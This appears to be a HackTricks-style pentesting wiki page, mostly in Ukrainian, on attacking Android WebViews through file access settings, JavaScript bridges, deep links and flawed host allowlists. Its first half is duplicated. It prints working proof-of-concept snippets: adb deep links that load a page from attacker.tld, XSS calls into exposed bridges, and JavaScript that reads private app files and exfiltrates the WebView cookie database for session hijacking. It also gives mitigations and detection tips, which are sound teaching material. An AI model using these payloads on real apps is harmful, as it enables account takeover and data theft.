# Webview Attacks

{{#include ../../banners/hacktricks-training.md}}

## Guide on WebView Configurations and Security

### Overview of WebView Vulnerabilities

Критичний аспект розробки для Android полягає в правильній обробці WebViews. Це керівництво висвітлює ключові конфігурації та практики безпеки, щоб зменшити ризики, пов'язані з використанням WebView.

![Приклад WebView](<../../images/image (1190).png>)

### **File Access in WebViews**

За замовчуванням WebViews дозволяють доступ до файлів. Ця функціональність керується методом `setAllowFileAccess()`, доступним з Android API level 3 (Cupcake 1.5). Додатки з дозволом **android.permission.READ_EXTERNAL_STORAGE** можуть читати файли з external storage, використовуючи file URL схему (`file://path/to/file`).

#### **Deprecated Features: Universal and File Access From URLs**

- **Universal Access From File URLs**: Ця застаріла функція дозволяла крос-доменні запити з file URL, створюючи значний ризик безпеки через можливі XSS-атаки. За замовчуванням вимкнена (`false`) для застосунків, що таргетять Android Jelly Bean і новіші версії.
- Щоб перевірити цей параметр, використовуйте `getAllowUniversalAccessFromFileURLs()`.
- Щоб змінити цей параметр, використовуйте `setAllowUniversalAccessFromFileURLs(boolean)`.
- **File Access From File URLs**: Ця функція, також застаріла, контролювала доступ до контенту з інших file scheme URL. Як і universal access, за замовчуванням вимкнена для підвищення безпеки.
- Використовуйте `getAllowFileAccessFromFileURLs()` для перевірки і `setAllowFileAccessFromFileURLs(boolean)` для встановлення.

#### **Secure File Loading**

Щоб вимкнути доступ до файлової системи, одночасно зберігаючи доступ до assets та resources, використовується метод `setAllowFileAccess()`. На Android R і вище значення за замовчуванням — `false`.

- Перевірте за допомогою `getAllowFileAccess()`.
- Увімкніть або вимкніть за допомогою `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

Клас **WebViewAssetLoader** — сучасний підхід для завантаження локальних файлів. Він використовує http(s) URL для доступу до локальних assets та resources, узгоджуючись з політикою Same-Origin і тим самим полегшуючи керування CORS.

### loadUrl

This is a common function used to load arbitrary URLs in a WebView:
```java
webview.loadUrl("<url here>")
```
Звісно, потенційний атакувальник не повинен мати можливості **контролювати URL**, який додаток збирається завантажити.

### **JavaScript та Intent Scheme: обробка**

- **JavaScript**: За замовчуванням вимкнений у WebViews, його можна ввімкнути через `setJavaScriptEnabled()`. Рекомендована обережність — ввімкнення JavaScript без належних запобіжних заходів може призвести до вразливостей безпеки.
- **Intent Scheme**: WebViews можуть обробляти схему `intent`, що потенційно може призвести до експлуатацій, якщо її не контролювати належним чином. Приклад вразливості включав відкритий параметр WebView "support_url", який можна було використати для виконання cross-site scripting (XSS) атак.

![Vulnerable WebView](<../../images/image (1191).png>)

Приклад експлуатації за допомогою adb:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Javascript Bridge

Android надає можливість, яка дозволяє **JavaScript** у WebView викликати **рідні функції Android-додатка**. Це реалізується за допомогою методу `addJavascriptInterface`, який інтегрує JavaScript з нативною функціональністю Android, відомою як _WebView JavaScript bridge_. Варто бути обережним, оскільки цей метод дозволяє всім сторінкам у WebView отримувати доступ до зареєстрованого JavaScript Interface object, що створює ризик для безпеки, якщо через ці інтерфейси розкривається чутлива інформація.

- **Потрібна крайня обережність** для додатків, що таргетять Android versions below 4.2 через вразливість, яка дозволяє remote code execution через malicious JavaScript, експлуатуючи reflection.

#### Implementing a JavaScript Bridge

- **JavaScript interfaces** можуть взаємодіяти з нативним кодом, як показано в прикладах, де метод класу відкрито для JavaScript:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- JavaScript Bridge вмикається шляхом додавання інтерфейсу до WebView:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge")
webView.reload()
```
- Можлива експлуатація через JavaScript, наприклад, через XSS attack, дозволяє виклик відкритих методів Java:
```html
<script>
alert(javascriptBridge.getSecret())
</script>
```
- Щоб зменшити ризики, **обмежте використання JavaScript bridge** до коду, що постачається в APK, і забороніть завантаження JavaScript із віддалених джерел. Для старіших пристроїв встановіть мінімальний API level на 17.

### Reflection-based Remote Code Execution (RCE)

- Задокументований метод дозволяє досягти RCE через reflection шляхом виконання певного payload. Однак анотація `@JavascriptInterface` перешкоджає несанкціонованому доступу до методів, обмежуючи поверхню атаки.

### Remote Debugging

- **Remote debugging** можливий за допомогою **Chrome Developer Tools**, що дозволяє взаємодіяти та виконувати довільний JavaScript у вмісті WebView.

#### Enabling Remote Debugging

- Remote debugging можна увімкнути для всіх WebViews в додатку шляхом:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Щоб умовно увімкнути налагодження залежно від стану debuggable додатку:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltrate arbitrary files

- Демонструє exfiltration довільних файлів за допомогою XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText)
}
}
xhr.open(
"GET",
"file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db",
true
)
xhr.send(null)
```
# Атаки на WebView

## Керівництво з конфігурацій і безпеки WebView

### Огляд уразливостей WebView

Критичною складовою розробки Android є правильне поводження з WebViews. Це керівництво висвітлює ключові конфігурації та практики безпеки для зменшення ризиків, пов'язаних із використанням WebView.

![Приклад WebView](<../../images/image (1190).png>)

### **Доступ до файлів у WebViews**

За замовчуванням WebViews дозволяють доступ до файлів. Ця функціональність контролюється методом `setAllowFileAccess()`, доступним з Android API level 3 (Cupcake 1.5). Додатки з дозволом **android.permission.READ_EXTERNAL_STORAGE** можуть читати файли з external storage, використовуючи file URL-схему (`file://path/to/file`).

#### **Deprecated Features: Universal and File Access From URLs**

- **Universal Access From File URLs**: Ця застаріла можливість дозволяла cross-origin запити з file URL, що створювало значний ризик безпеки через потенційні XSS-атаки. Значення за замовчуванням вимкнене (`false`) для додатків, що таргетять Android Jelly Bean і новіші версії.
- Для перевірки цього налаштування використовуйте `getAllowUniversalAccessFromFileURLs()`.
- Для зміни використовуйте `setAllowUniversalAccessFromFileURLs(boolean)`.
- **File Access From File URLs**: Ця також застаріла можливість контролювала доступ до контенту з інших URL зі схемою file. Як і universal access, за замовчуванням вона вимкнена для підвищення безпеки.
- Використовуйте `getAllowFileAccessFromFileURLs()` для перевірки і `setAllowFileAccessFromFileURLs(boolean)` для встановлення.

#### **Безпечне завантаження файлів**

Щоб вимкнути доступ до файлової системи, але при цьому мати доступ до assets і ресурсів, використовується метод `setAllowFileAccess()`. На Android R і новіше значення за замовчуванням — `false`.

- Перевіряється через `getAllowFileAccess()`.
- Увімкнути або вимкнути можна через `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

Клас **WebViewAssetLoader** — сучасний підхід для завантаження локальних файлів. Він використовує http(s) URL для доступу до локальних assets і ресурсів, узгоджуючись із Same-Origin policy та полегшуючи управління CORS.

### loadUrl

Це поширена функція для завантаження довільних URL у WebView:
```java
webview.loadUrl("<url here>")
```
Звісно, потенційний зловмисник ніколи не повинен мати можливість **control the URL**, який додаток збирається завантажити.

### Deep-linking у внутрішній WebView (custom scheme → WebView sink)

Багато додатків реєструють custom schemes/paths, які спрямовують user-supplied URL у in-app WebView. Якщо deep link експортується (VIEW + BROWSABLE), зловмисник може змусити додаток відобразити довільний віддалений контент у контексті його WebView.

Типовий шаблон manifest (спрощено):
```xml
<activity android:name=".MainActivity" android:exported="true">
<intent-filter>
<action android:name="android.intent.action.VIEW" />
<category android:name="android.intent.category.DEFAULT" />
<category android:name="android.intent.category.BROWSABLE" />
<data android:scheme="myscheme" android:host="com.example.app" />
</intent-filter>
</activity>
```
Загальний потік коду (спрощено):
```java
// Entry activity
@Override
protected void onNewIntent(Intent intent) {
Uri deeplink = intent.getData();
String url = deeplink.getQueryParameter("url"); // attacker-controlled
if (deeplink.getPathSegments().get(0).equals("web")) {
Intent i = new Intent(this, WebActivity.class);
i.putExtra("url", url);
startActivity(i);
}
}

// WebActivity sink
webView.loadUrl(getIntent().getStringExtra("url"));
```
Схема атаки та PoC через adb:
```bash
# Template – force load in internal WebView
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# If a specific Activity must be targeted
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impact: віддалена сторінка виконується в контексті додатку WebView (cookies/session профілю WebView додатку, доступ до будь-якого відкритого @JavascriptInterface, потенційний доступ до content:// та file:// залежно від налаштувань).

Hunting tips:
- Пошукайте в декомпільованих джерелах за `getQueryParameter("url")`, `loadUrl(`, `WebView` sinks, та обробниками deep-link (`onCreate/onNewIntent`).
- Перегляньте manifest на предмет фільтрів VIEW+BROWSABLE і кастомних схем/хостів, які мапляться на activities, що пізніше запускають WebView.
- Перевірте, чи існує кілька шляхів deep-link (наприклад, шлях “external browser” проти шляху “internal webview”) і надавайте перевагу тому, який рендериться всередині додатку.

### Enabling JavaScript before verification (order-of-checks bug)

Поширеною помилкою при hardening є увімкнення JavaScript або конфігурування розслаблених налаштувань WebView до завершення остаточної allowlist/verification цільового URL. Якщо верифікація є неконсистентною між допоміжними компонентами або відбувається занадто пізно, attacker deep link може потрапити в стан, коли:

1) Налаштування WebView застосовано (наприклад, `setJavaScriptEnabled(true)`), та
2) Недовірений URL завантажується з увімкненим JavaScript.

Bug pattern (pseudocode):
```java
// 1) Parse/early checks
Uri u = parse(intent);
if (!looksValid(u)) return;

// 2) Configure WebView BEFORE final checks
webView.getSettings().setJavaScriptEnabled(true); // BAD: too early
configureMixedContent();

// 3) Do final verification (late)
if (!finalAllowlist(u)) return; // too late – JS already enabled

// 4) Load
webView.loadUrl(u.toString());
```
Чому це можна експлуатувати
- Непослідовна нормалізація: допоміжні функції розбивають/перебудовують URL інакше, ніж остаточна перевірка, створюючи невідповідності, які може використати зловмисний URL.
- Неправильний порядок у конвеєрі: ввімкнення JS на кроці 2 застосовується глобально до екземпляра WebView, впливаючи на остаточне завантаження навіть якщо перевірка пізніше не пройде.

Як тестувати
- Створіть deep-link payloads, які проходять ранні перевірки і дістаються до сайту конфігурації WebView.
- Використовуйте adb, щоб надіслати implicit VIEW intents, що доставляють параметр `url=` під вашим контролем:
```bash
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Якщо exploitation вдасться, ваш payload виконує JavaScript у WebView додатку. Звідти перевіряйте на наявність exposed bridges:
```html
<script>
for (let k in window) {
try { if (typeof window[k] === 'object' || typeof window[k] === 'function') console.log('[JSI]', k); } catch(e){}
}
</script>
```
Рекомендації щодо захисту
- Канонізуйте один раз; суворо перевіряйте за єдиним джерелом істини (scheme/host/path/query).
- Викликайте `setJavaScriptEnabled(true)` лише після проходження всіх allowlist-перевірок і безпосередньо перед завантаженням довіреного контенту.
- Уникайте експонування `@JavascriptInterface` для недовірених origin'ів; надавайте перевагу обмеженню за кожним origin окремо.
- Розгляньте окремі інстанси WebView для довіреного та недовіреного контенту, причому JS за замовчуванням вимкнено.

### **Обробка JavaScript та Intent Scheme**

- **JavaScript**: За замовчуванням вимкнено у WebViews, його можна увімкнути через `setJavaScriptEnabled()`. Рекомендується обережність, оскільки увімкнення JavaScript без відповідних запобіжних заходів може призвести до вразливостей безпеки.
- **Intent Scheme**: WebViews можуть обробляти схему `intent`, що потенційно може призвести до експлуатацій, якщо її не контролювати ретельно. Приклад вразливості включав відкритий параметр WebView "support_url", який можна було використати для виконання cross-site scripting (XSS) attacks.

![Vulnerable WebView](<../../images/image (1191).png>)

Приклад експлуатації з використанням adb:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Javascript Bridge

Android надає можливість, яка дозволяє **JavaScript** у WebView викликати **native Android app functions**. Це досягається за допомогою методу `addJavascriptInterface`, який інтегрує JavaScript з рідними функціями Android, відомий як _WebView JavaScript bridge_. Слід бути обережним, оскільки цей метод дозволяє всім сторінкам у WebView отримувати доступ до зареєстрованого об'єкта JavaScript Interface, що створює ризик для безпеки, якщо через ці інтерфейси розкриваються конфіденційні дані.

- **Extreme caution is required** для додатків, що орієнтовані на Android версії нижче 4.2, через вразливість, яка дозволяє remote code execution через шкідливий JavaScript, експлуатуючи reflection.

#### Реалізація JavaScript Bridge

- **JavaScript interfaces** можуть взаємодіяти з нативним кодом, як показано у прикладах, де метод класу експонується для JavaScript:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- JavaScript Bridge вмикається шляхом додавання інтерфейсу до WebView:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge")
webView.reload()
```
- Потенційна експлуатація через JavaScript, наприклад, через XSS attack, дозволяє викликати відкриті методи Java:
```html
<script>
alert(javascriptBridge.getSecret())
</script>
```
- Щоб зменшити ризики, **restrict JavaScript bridge usage** до коду, який постачається з APK, і заборонити завантаження JavaScript з віддалених джерел. Для старіших пристроїв встановіть мінімальний API level на 17.

#### Зловживання dispatcher-style JS bridges (invokeMethod/handlerName)

Поширений шаблон — один експортований метод (наприклад, `@JavascriptInterface void invokeMethod(String json)`), який десеріалізує керований зловмисником JSON у загальний об'єкт і викликає відповідний обробник на основі вказаного імені. Типова структура JSON:
```json
{
"handlerName": "toBase64",
"callbackId": "cb_12345",
"asyncExecute": "true",
"data": { /* handler-specific fields */ }
}
```
Risk: якщо будь-який зареєстрований handler виконує привілейовані дії над даними від атакуючого (наприклад, прямі читання файлів), ви можете викликати його, встановивши `handlerName` відповідно. Результати зазвичай повертаються у контекст сторінки через `evaluateJavascript` і механізм callback/promise, індексований `callbackId`.

Key hunting steps
- Декомпілюйте та grep-те по `addJavascriptInterface(`, щоб дізнатися ім'я bridge-об'єкта (наприклад, `xbridge`).
- У Chrome DevTools (chrome://inspect) введіть ім'я bridge-об'єкта в Console (наприклад, `xbridge`), щоб перерахувати відкриті поля/методи; шукайте generic dispatcher на кшталт `invokeMethod`.
- Перерахуйте handlers, шукаючи класи, які реалізують `getModuleName()` або мапи реєстрації.

#### Arbitrary file read via URI → File sinks (Base64 exfiltration)

If a handler takes a URI, calls `Uri.parse(req.getUri()).getPath()`, builds `new File(...)` and reads it without allowlists or sandbox checks, you get an arbitrary file read in the app sandbox that bypasses WebView settings like `setAllowFileAccess(false)` (the read happens in native code, not via the WebView network stack).

PoC to exfiltrate the Chromium WebView cookie DB (session hijack):
```javascript
// Minimal callback sink so native can deliver the response
window.WebViewJavascriptBridge = {
_handleMessageFromObjC: function (data) { console.log(data) }
};

const payload = JSON.stringify({
handlerName: 'toBase64',
callbackId: 'cb_' + Date.now(),
data: { uri: 'file:///data/data/<pkg>/app_webview/Default/Cookies' }
});

xbridge.invokeMethod(payload);
```
Notes
- Cookie DB paths vary across devices/providers. Common ones:
- `file:///data/data/<pkg>/app_webview/Default/Cookies`
- `file:///data/data/<pkg>/app_webview_<pkg>/Default/Cookies`
- The handler returns Base64; decode to recover cookies and impersonate the user in the app’s WebView profile.

Detection tips
- Watch for large Base64 strings returned via `evaluateJavascript` when using the app.
- Grep decompiled sources for handlers that accept `uri`/`path` and convert them to `new File(...)`.

#### Bypassing WebView privilege gates – endsWith() host checks

Рішення щодо привілеїв (вибір JSB-enabled Activity) часто покладаються на host allowlists. Помилковий шаблон виглядає так:
```java
String host = Uri.parse(url).getHost();
boolean z = true;
if (!host.endsWith(".trusted.com")) {
if (!".trusted.com".endsWith(host)) {
z = false;
}
}
// z==true → open privileged WebView
```
Еквівалентна логіка (закони Де Моргана):
```java
boolean z = host.endsWith(".trusted.com") ||
".trusted.com".endsWith(host);
```
Це не перевірка origin. Багато непередбачених хостів задовольняють другу умову, дозволяючи недовіреним доменам потрапити в привілейовану Activity. Завжди перевіряйте scheme та host за суворим allowlist (точне співпадіння або коректна перевірка субдомену з dot-boundaries), а не трюки з `endsWith`.

#### javascript:// примітива виконання через loadUrl

Опинившись у привілейованому WebView, додатки іноді виконують inline JS через:
```java
webView.loadUrl("javascript:" + jsPayload);
```
If an internal flow triggers `loadUrl("javascript:...")` in that context, injected JS executes with bridge access even if the external page wouldn’t normally be allowed. Pentest steps:
- Grep for `loadUrl("javascript:` and `evaluateJavascript(` in the app.
- Try to reach those code paths after forcing navigation to the privileged WebView (e.g., via a permissive deep link chooser).
- Use the primitive to call the dispatcher (`xbridge.invokeMethod(...)`) and reach sensitive handlers.

Mitigations (developer checklist)
- Strict origin verification for privileged Activities: canonicalize and compare scheme/host against an explicit allowlist; avoid `endsWith`-based checks. Consider Digital Asset Links when applicable.
- Scope bridges to trusted pages only and re-check trust on every call (per-call authorization).
- Remove or tightly guard filesystem-capable handlers; prefer `content://` with allowlists/permissions over raw `file://` paths.
- Avoid `loadUrl("javascript:")` in privileged contexts or gate it behind strong checks.
- Remember `setAllowFileAccess(false)` doesn’t protect against native file reads via the bridge.

#### JSB перерахування та поради з налагодження

- Увімкніть WebView remote debugging, щоб використовувати Chrome DevTools Console:
- App-side (debug builds): `WebView.setWebContentsDebuggingEnabled(true)`
- System-side: modules like [LSPosed](https://github.com/LSPosed/LSPosed) or Frida scripts can force-enable debugging even in release builds. Example Frida snippet for Cordova WebViews: [cordova enable webview debugging](http://codeshare.frida.re/@gameFace22/cordova---enable-webview-debugging/)
- In DevTools, type the bridge object name (e.g., `xbridge`) to see exposed members and probe the dispatcher.


### Reflection-based Remote Code Execution (RCE)

- A documented method allows achieving RCE through reflection by executing a specific payload. However, the `@JavascriptInterface` annotation prevents unauthorized method access, limiting the attack surface.

### Remote Debugging

- **Remote debugging** is possible with **Chrome Developer Tools**, enabling interaction and arbitrary JavaScript execution within the WebView content.

#### Enabling Remote Debugging

- Remote debugging can be enabled for all WebViews within an application by:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Щоб умовно увімкнути debugging залежно від debuggable стану додатка:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Екфільтрація довільних файлів

- Показано екфільтрацію довільних файлів з використанням XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText)
}
}
xhr.open(
"GET",
"file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db",
true
)
xhr.send(null)
```
## Посилання

- [Review of Android WebViews file access attack vectors](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
- [WheresMyBrowser.Android (demo app)](https://github.com/authenticationfailure/WheresMyBrowser.Android)
- [Android WebView reference](https://developer.android.com/reference/android/webkit/WebView)
- [Deep Links & WebViews Exploitations – Part II](https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1)
- [Deep Links & WebViews Exploitations – Part I](https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwnown-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Account takeover in Android app via JSB – tuxplorer.com](https://tuxplorer.com/posts/account-takeover-via-jsb/)
- [LSPosed – systemless Xposed framework](https://github.com/LSPosed/LSPosed)
- [Frida codeshare: Cordova – enable WebView debugging](http://codeshare.frida.re/@gameFace22/cordova---enable-webview-debugging/)

{{#include ../../banners/hacktricks-training.md}}
